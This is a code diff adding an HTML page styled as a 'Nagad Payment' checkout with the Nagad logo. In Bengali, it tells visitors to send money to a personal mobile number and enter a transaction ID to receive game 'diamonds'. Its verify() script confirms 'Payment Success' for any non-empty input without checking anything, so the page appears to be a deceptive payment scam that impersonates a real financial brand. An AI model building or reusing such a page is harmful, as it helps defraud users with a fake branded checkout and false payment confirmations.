@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nagad Payment</title>
+<style>
+body { background: #f5f7fa; margin: 0; padding: 0; font-family: Arial; }
+.header { background: #fff; padding: 10px; display: flex; align-items: center; gap: 10px; }
+.header img { height: 35px; }
+.wallet-box { background: #fff; margin: 15px; padding: 15px; border-radius: 8px; display: flex; align-items: center; gap: 10px; }
+.wallet-box img { width: 40px; height: 40px; border: 1px solid #eee; border-radius: 50%; padding: 5px; }
+.amount-box { background: #fff; margin: 0 15px 15px; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; color: #555; }
+.main-box { background: #D50032; margin: 15px; padding: 20px; border-radius: 10px; color: #fff; }
+.main-box h3 { text-align: center; margin-bottom: 15px; font-size: 18px; }
+.trx-input { width: 100%; padding: 12px; border: none; border-radius: 8px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
+.main-box ul { list-style: none; padding: 0; margin: 0; }
+.main-box li { margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.2); font-size: 14px; line-height: 1.6; }
+.main-box li:last-child { border: none; }
+.yellow { color: #FFEB3B; font-weight: bold; }
+.copy-btn { background: #6c757d; color: #fff; border: none; padding: 5px 12px; border-radius: 5px; margin-left: 8px; cursor: pointer; font-size: 12px; }
+.verify-btn { width: 100%; background: #d50032; color: #fff; padding: 15px; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 15px; cursor: pointer; }
+.success { background: #4CAF50; color: #fff; padding: 10px; border-radius: 8px; text-align: center; margin: 0 15px 15px; display: none; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="header">
+<img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Nagad_Logo.png" alt="Nagad">
+</div>
+
+<div class="wallet-box">
+<img src="images/wallet.png" alt="">
+<span style="color:#555; font-weight:bold;">Wallet</span>
+</div>
+
+<div class="amount-box">৳ <span id="amount">0</span></div>
+
+<div id="success" class="success">✅ 1.3 সেকেন্ডের মধ্যে ডায়মন্ড পেয়ে যাবেন!</div>
+
+<div class="main-box">
+<h3>ট্রান্সজেকশন আইডি দিন</h3>
+<input type="text" id="trxId" class="trx-input" placeholder="ট্রান্সজেকশন আইডি দিন">
+<ul>
+<li>• *167# ডায়াল করে আপনার Nagad মোবাইল মেনুতে যান অথবা Nagad অ্যাপে যান।</li>
+<li>• <span class="yellow">"Send Money"</span> -এ ক্লিক করুন।</li>
+<li>• প্রাপক নম্বর হিসেবে এই নম্বরটি লিখুন: <span class="yellow">01873786543</span> <button class="copy-btn" onclick="copy('01873786543')">Copy</button></li>
+<li>• টাকার পরিমাণ: <span class="yellow" id="tk">0</span></li>
+<li>• নিশ্চিত করতে এখন আপনার Nagad মোবাইল মেনু পিন লিখুন।</li>
+<li>• সবকিছু ঠিক থাকলে, আপনি Nagad থেকে একটি নিশ্চিতকরণ বার্তা পাবেন।</li>
+<li>• এখন উপরের বক্সে আপনার <span class="yellow">Transaction ID</span> দিন এবং নিচের <span class="yellow">VERIFY</span> বাটনে ক্লিক করুন।</li>
+</ul>
+<button class="verify-btn" onclick="verify()">VERIFY</button>
+</div>
+
+<script>
+let amount = localStorage.getItem('amount') || 0;
+document.getElementById('amount').innerText = amount;
+document.getElementById('tk').innerText = amount;
+
+function verify(){
+if(document.getElementById('trxId').value == ''){ alert("Transaction ID দিন"); return; }
+document.getElementById('success').style.display = 'block';
+setTimeout(()=>{ alert("Payment Success! 1.3s এর মধ্যে ডায়মন্ড পাবেন"); window.location.href='index.html'; },1300);
+}
+function copy(num){ navigator.clipboard.writeText(num); alert("Copied: "+num); }
+</script>
+</body>
+</html>
